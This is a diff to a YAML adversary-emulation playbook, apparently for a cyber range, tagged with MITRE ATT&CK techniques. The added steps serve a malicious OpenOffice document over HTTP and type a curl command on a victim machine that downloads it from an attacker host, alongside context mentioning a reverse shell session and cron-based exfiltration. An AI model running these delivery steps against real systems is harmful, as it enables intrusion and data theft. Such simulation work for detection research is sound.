@@ -33,6 +33,14 @@ commands:
     port: 8083
     background: True
 
+################### SERVE THE OPEN OFFICE DOCUMENT ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/Nutzungshinweise.odt
+    port: 8086
+    background: True
+
 ################### SERVE VEILTRANSFER CLIENT ############################
 
   # serve payload via http
@@ -114,6 +122,26 @@ commands:
     cmd: type 
     input: echo 'Dummy Text' | xclip -selection clipboard
     session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc 
+    cmd: type 
+    input: "curl -o /home/judy/Nutzungshinweise.odt dailynews-wire.com:8086/index"
+    session: client
+    metadata:
+      techniques: "T1105,T1204.002"
+      tactics: "Command and Control, Execution"
+      technique_name: "Ingress Tool Transfer,User Execution: Malicious File"
 
   - type: sleep
     seconds: 3
@@ -256,6 +284,7 @@ commands:
       techniques: "T1029,T1053.003,T1048.001"
       tactics: "Persistence, Execution,Exfiltration"
       technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+ 
   # find out which windown are open
   - type: msf-session
     session: revshell
